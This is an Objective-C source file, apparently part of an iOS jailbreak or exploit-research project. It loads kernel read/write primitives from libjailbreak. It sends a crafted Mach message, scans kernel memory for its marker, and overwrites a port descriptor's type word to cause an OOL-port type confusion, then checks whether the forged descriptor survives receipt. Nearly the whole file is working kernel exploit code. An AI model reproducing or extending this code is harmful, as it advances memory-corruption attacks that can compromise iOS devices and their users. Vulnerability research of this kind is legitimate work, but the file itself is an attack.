//
//  P113DescForgeControl.m — v1 hand-forged desc control (mechanism proof).
//  Honesty: kwrite is the PROVEN cs2core provider (hasKwrite=YES only via
//  board.commitSlide). No ANE needed. Panics unlikely (writes into our own
//  one kmsg's own words, discovered by exact marker match).
#import "P113DescForgeControl.h"
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <objc/message.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <fcntl.h>

#define P113_BUILD @"p113-descforge-control-v2"
#define P113_MAGIC 0x50313333u   /* "P133" marker in body */
#define P113_NDESC 16u

static int p113_fd = -1;
static void p113_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p113_log(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p113_fd >= 0) { const char *c = s.UTF8String; write(p113_fd, c, strlen(c)); write(p113_fd, "\n", 1); }
    NSLog(@"%@", s);
}

/* krw handlers — same dlopen law as P007KreadLane (device-proven). */
typedef int (*krw_kread_t)(uint64_t, void *, size_t);
typedef int (*krw_kwrite_t)(uint64_t, const void *, size_t);
typedef int (*krw_kbase_t)(uint64_t *);
static krw_kread_t  g_rd;
static krw_kwrite_t g_wr;
static krw_kbase_t  g_kb;

static BOOL p113_krw(void) {
    if (g_rd) return YES;
    const char *paths[] = { "/var/jb/usr/lib/libjailbreak.dylib",
                            "/var/jb/basebin/libjailbreak.dylib",
                            "/usr/lib/libjailbreak.dylib", NULL };
    for (int i = 0; paths[i]; i++) {
        void *h = dlopen(paths[i], RTLD_NOW);
        if (!h) continue;
        void *sym = dlsym(h, "krw_initializer");
        if (!sym) continue;
        struct { void *kbase; void *kread; void *kwrite; unsigned long z[8]; } hd;
        memset(&hd, 0, sizeof hd);
        if (((int (*)(void *))sym)(&hd) != 0 || !hd.kread || !hd.kwrite || !hd.kbase) continue;
        g_rd = (krw_kread_t)hd.kread; g_wr = (krw_kwrite_t)hd.kwrite; g_kb = (krw_kbase_t)hd.kbase;
        p113_log(@"[+] krw via %s", paths[i]);
        return YES;
    }
    p113_log(@"[-] no krw provider (tap cs2core first on this boot)");
    return NO;
}

static mach_port_t p113_port(uint32_t idx, uint8_t *buf, uint32_t sz) {
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    mach_msg_body_t *b = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    b->msgh_descriptor_count = P113_NDESC;
    /* v2 law: ALL descs are real live rights — fabricated names 0x1100+i fail
       copyin outright (send kr!=0, kmsg never enters the kernel). Mirrors the
       p073 sentPre victims (16 live port-kind descs). */
    mach_port_t rcv[P113_NDESC];
    for (uint32_t i = 0; i < P113_NDESC; i++) {
        rcv[i] = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rcv[i]) != KERN_SUCCESS) return MACH_PORT_NULL;
        if (mach_port_insert_right(mach_task_self(), rcv[i], rcv[i], MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) return MACH_PORT_NULL;
        mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + i * 12);
        d->name = rcv[i];   /* our own Send right — valid for COPY_SEND */
        d->pad1 = 0; d->disposition = MACH_MSG_TYPE_COPY_SEND; d->type = MACH_MSG_PORT_DESCRIPTOR;
    }
    memcpy(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12,
           "P133M", 5);
    uint32_t tag = idx ^ P113_MAGIC;
    memcpy(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12 + 8, &tag, 4);
    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    h->msgh_size = sz; h->msgh_remote_port = rcv[0]; h->msgh_id = (int)P113_MAGIC;
    return rcv[0];
}

static NSString *P113Ret(void);
static NSString *ane_none(void) { return P113Ret(); }
static NSString *g_buf0(void) { return P113Ret(); }
static NSString *P113Ret(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    p113_log(@"=== p113 end ===");
    if (p113_fd >= 0) { fcntl(p113_fd, F_FULLFSYNC); close(p113_fd); p113_fd = -1; }
    NSString *p = [docs stringByAppendingPathComponent:@"p113_descforge_log.txt"];
    NSString *t = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
    return t ?: @"p113: empty";
}

@implementation P113DescForgeControl

+ (NSString *)tap {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    p113_fd = open([[docs stringByAppendingPathComponent:@"p113_descforge_log.txt"] fileSystemRepresentation],
                   O_CREAT | O_WRONLY | O_TRUNC, 0644);
    p113_log(@"=== p113 session build=%@ ===", P113_BUILD);
    if (!p113_krw()) { if (p113_fd>=0){close(p113_fd);p113_fd=-1;} return g_buf0(); }
    uint64_t kb = 0; if (g_kb(&kb)) p113_log(@"kbase=0x%llx", kb);

    /* exact complex size: hdr + body + 16 descs + body{marker5,pad3,tag4} */
    const uint32_t sz = (uint32_t)(sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12 + 12);
    uint8_t *buf = calloc(1, sz);
    mach_port_t hold = p113_port(1, buf, sz);
    if (!hold) { p113_log(@"[-] kmsg build fail"); return ane_none(); }
    kern_return_t kr = mach_msg((mach_msg_header_t *)buf, MACH_SEND_MSG, sz, 0,
                                MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    p113_log(@"send kr=%u", kr);

    /* kernel-scan for the marker 'P133M' + tag — content signature law */
    uint64_t found = 0;
    {
        uint64_t kb2 = 0; if (!g_kb(&kb2)) return ane_none();
        const uint64_t band = kb2 + 0x4000000ULL;
        static const uint64_t win = 0x200000ULL;
        uint8_t *rb = malloc(0x4000);
        for (uint64_t q = 0; q < win && !found; q += 0x4000) {
            uint64_t a = band + q; uint64_t got = 0;
            vm_size_t vsz = 0x4000;
            kern_return_t vr = vm_read_overwrite(mach_task_self(), (vm_address_t)(uintptr_t)a,
                0x4000, (vm_address_t)(uintptr_t)rb, &vsz);
            if (vr != KERN_SUCCESS) continue;
            for (uint32_t i = 0; i + 16 <= 0x4000; i += 4)
                if (memcmp(rb + i, "P133M", 5) == 0) { found = a + i; break; }
        }
        free(rb);
    }
    if (!found) { p113_log(@"[-] marker not found in scan band — widen or scan different band"); }
    else {
        p113_log(@"[+] kmsg kdata @0x%llx (marker 'P133M' found)", found);
        /* v2: dump the kernel desc area BEFORE touching it — learns the live
           encoding (12B wire stride vs 16B pointer stride) in one shot. */
        {
            uint8_t pre[0x100];
            if (g_rd(found - 0x100, pre, 0x100) == 0)
                for (uint32_t r2 = 0; r2 < 0x100; r2 += 32) {
                    uint32_t *w = (uint32_t *)(pre + r2);
                    p113_log(@"  pre[-0x%03x]: %08x %08x %08x %08x %08x %08x %08x %08x",
                             (uint32_t)(0x100 - r2), w[0], w[1], w[2], w[3], w[4], w[5], w[6], w[7]);
                }
            else p113_log(@"[-] desc-area pre-read fail");
        }
        /* port-desc type word: 12B stride → desc0.type+8; 16B ptr stride →
           desc4.type+8 — SAME VA (marker - 0xB8) under either encoding.
           Pre-dump tells us which desc got hit. */
        uint64_t tw = found - 0xB8;
        uint8_t typepre[4];
        if (g_rd(tw, typepre, 4) == 0)
            p113_log(@"[*] type word pre @marker-0xB8 = %02x%02x%02x%02x (want 00 = PORT_DESCRIPTOR)",
                     typepre[0], typepre[1], typepre[2], typepre[3]);
        uint8_t wd[4] = { 0x01, 0x00, 0x00, 0x00 };  /* type=1 (OOL port) */
        if (g_wr(tw, wd, 4) == 0) p113_log(@"[+] kwrite OK — port-desc type word → 1 (OOL-port confusion)");
        else p113_log(@"[-] type kwrite fail");
        /* second, encoding-independent control: the tag word (body, marker+8) */
        uint32_t tagmagic = 0x44434241;
        if (g_wr(found + 8, &tagmagic, 4) == 0) p113_log(@"[+] tag kwrite OK (body data-path control)");
        else p113_log(@"[-] tag kwrite fail");
    }
    /* recv the victim: kernel validates descs on receive — forged type survives? */
    uint8_t rbuf[0x3000]; memset(rbuf, 0, sizeof rbuf);
    mach_msg_header_t *rh = (mach_msg_header_t *)rbuf;
    kr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof rbuf, hold, 3000, MACH_PORT_NULL);
    p113_log(@"recv kr=%u size=%u", kr, rh->msgh_size);
    if (kr == 0) {
        mach_msg_body_t *rb2 = (mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t));
        p113_log(@"[+] RECV OK count=%u", rb2->msgh_descriptor_count);
        int type1 = -1;
        for (uint32_t d = 0; d < P113_NDESC; d++) {
            uint8_t *p = rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + d * 12;
            uint16_t ty = *(uint16_t *)(p + 8);
            if (d < 6) p113_log(@"  desc%u: name=%08x type=%02x disp=%02x",
                                d, *(uint32_t *)p, ty, *(uint16_t *)(p + 10));
            if (ty == 1 && type1 < 0) type1 = (int)d;
        }
        if (type1 >= 0)
            p113_log(@"[+++] CONVERSION BAR: desc_type_forged CONFIRMED — desc%u.type=1 RECEIVED (OOL-port honored)", type1);
        else
            p113_log(@"[-] no type=1 in translated descs — validator normalized or write missed");
    } else if (kr == MACH_RCV_BODY_ERROR) {
        p113_log(@"[*] kr=MACH_RCV_BODY_ERROR — translated walk hit the forged desc (confusion REACHED, body torn)");
    } else {
        p113_log(@"[*] recv kr=%u (unexpected)", kr);
    }
    /* encoding-independent data-path bar: marker in recv body + our kwrite tag */
    for (uint32_t i = 0; i + 12 < sizeof rbuf; i += 4)
        if (memcmp(rbuf + i, "P133M", 5) == 0) {
            uint32_t tg = *(uint32_t *)(rbuf + i + 8);
            p113_log(tg == 0x44434241
                ? @"[+++] DATA PATH: body_forged CONFIRMED — tag 0x44434241 round-tripped kwrite→kmsg→recv"
                : @"[-] marker received but tag not our kwrite value (kwrite missed the body word)");
            break;
        }
    return P113Ret();
}

@end
